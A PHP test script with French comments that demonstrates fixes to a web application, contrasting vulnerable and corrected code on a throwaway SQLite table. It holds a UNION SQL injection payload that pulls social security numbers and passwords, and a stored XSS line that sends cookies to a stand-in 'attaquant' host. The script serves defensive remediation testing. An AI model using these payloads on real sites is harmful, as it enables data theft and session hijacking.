<?php
// Banc de test autonome (SQLite) reproduisant les motifs vulnérables d'origine
// et les motifs corrigés, pour prouver avant/après sans serveur MySQL.
$db = new PDO('sqlite::memory:');
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$db->exec("CREATE TABLE utilisateurs (id INTEGER PRIMARY KEY, identifiant TEXT, mot_de_passe TEXT, role TEXT, num_securite_sociale TEXT)");
$db->exec("INSERT INTO utilisateurs VALUES (1,'admin','x','admin','123456789012345'),(2,'dupont','y','user','198012345678901')");

function line($s){ echo $s."\n"; }

// Charge d'attaque SQLi UNION typique de la Partie 2 (extraction NSS + mot de passe)
$payload = "zzz' UNION SELECT num_securite_sociale, mot_de_passe FROM utilisateurs -- ";

line("========== SQLi : recherche d'utilisateur ==========");

// --- AVANT : concaténation directe (code d'origine admin_recherche.php) ---
line("[AVANT] motif vulnérable : WHERE identifiant = '\$recherche'");
$sql = "SELECT identifiant, role FROM utilisateurs WHERE identifiant = '$payload'";
$rows = $db->query($sql)->fetchAll(PDO::FETCH_ASSOC);
line("  Lignes renvoyées : ".count($rows));
foreach ($rows as $r) line("    -> ".$r['identifiant']." | ".$r['role']."   <-- DONNÉES SENSIBLES EXFILTRÉES");

// --- APRÈS : requête préparée (code corrigé) ---
line("[APRÈS] requête préparée : WHERE identifiant = ?");
$stmt = $db->prepare("SELECT identifiant, role FROM utilisateurs WHERE identifiant = ?");
$stmt->execute([$payload]);
$rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
line("  Lignes renvoyées : ".count($rows)."  (le payload est traité comme un simple identifiant, 0 résultat)");

line("");
line("========== XSS stocké : affichage d'un message ==========");
$msg = "<script>fetch('http://attaquant/?c='+document.cookie)</script>";

// --- AVANT : écho brut (code d'origine admin_messages.php) ---
$avant = "<b>Message :</b> <br>".$msg;
line("[AVANT] sortie brute :");
line("  ".$avant."   <-- <script> ACTIF dans le navigateur admin");

// --- APRÈS : htmlspecialchars (code corrigé) ---
$apres = "<b>Message :</b><br>".nl2br(htmlspecialchars($msg, ENT_QUOTES|ENT_SUBSTITUTE, 'UTF-8'));
line("[APRÈS] sortie échappée :");
line("  ".$apres."   <-- affiché comme texte, AUCUN script exécuté");

line("");
line("========== Mot de passe : vérification ==========");
$hash = password_hash('SuperSecretAdmin123!', PASSWORD_DEFAULT);
line("[APRÈS] password_verify(bon mdp)  : ".(password_verify('SuperSecretAdmin123!', $hash) ? 'OK' : 'ECHEC'));
line("[APRÈS] password_verify(mauvais)  : ".(password_verify('autre', $hash) ? 'OK (anormal)' : 'refusé'));
